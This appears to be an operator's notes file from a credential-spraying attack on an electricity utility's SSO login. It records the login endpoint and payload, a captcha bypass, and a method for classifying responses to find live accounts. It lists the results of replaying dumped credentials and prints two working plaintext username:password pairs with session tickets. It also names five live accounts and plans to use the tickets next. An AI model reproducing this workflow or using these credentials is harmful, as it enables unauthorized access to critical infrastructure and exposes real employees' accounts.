# EVN Hanoi SSO — credential spray (2026-09-30)

## Endpoint
- `POST https://sso.evnhanoi.vn/users/login` (found in Nuxt bundle `/_nuxt/6955f1d.js` — page form has no action)
- Payload: `{"username","password","appCode":"","captcha":"","tokenCaptcha":"","ip":""}`
- **Captcha not enforced server-side** — `/getSessionCaptcha` exists but empty captcha/tokenCaptcha works.
- Success → `{"state":true,...,"ticket":"<md5>"}` (not cookies). JS shows ticket flow: `/users/loadProfile?ticket=`, `/sso/check_access_app?ticket=`, app codes DOFFICE/HRMS/IMIS/CMIS set different cookies.

## Response classification (full-phrase match, NOT substrings)
| msg | class |
|---|---|
| `state:true` / ticket string | OK |
| "Tài khoản đã bị khóa, vui lòng liên hệ quản trị viên" | LOCKED |
| "Tài khoản chưa được đăng ký" | NOTFOUND |
| "Mật khẩu không chính xác. Đăng nhập sai lần thứ N" | FAIL (account alive, N attempts left) |

- PITFALL: `"kho" in msg` matches "Tài**kho**ản" → everything LOOKS LOCKED. Also "chưa được đăng **ký**" isn't "khoá". Match whole phrases, test classifier on 2 known accounts before bulk run.

## Results (594 valid creds from 1124 dump lines, `pentest\evnhanoi_sso\`)
- 2 OK: `C09\chientd1:Evnvpkg@123` → ticket a649f968e5aa59732ee45bddee51caed; `c15\loitt:Spago@123456` → ticket 9c5b3e9487cc1a06a6e56e0475e8181e
- 5 FAIL (alive, pass truncated in dump or changed): C13\hangdt, c01:haden, hn05\hanhlh, pcthanhtri\thanhnt1, C09\TamTH
- 284 LOCKED / 353 NOTFOUND. Many `DOMAIN\user` accounts NOTFOUND — SSO usernames may differ from Windows-style dump names; retry with bare-username variant is untested.
- Next steps: `loadProfile?ticket=` on the 2 OK tickets; `/sso/login` app enumeration.

## Tooling notes
- curl with backslash JSON broke (bash escaping); python requests worked.
- Script: `pentest\evnhanoi_sso\check_sso_creds.py` (parse → dedupe → range → POST → classify → append TSV).
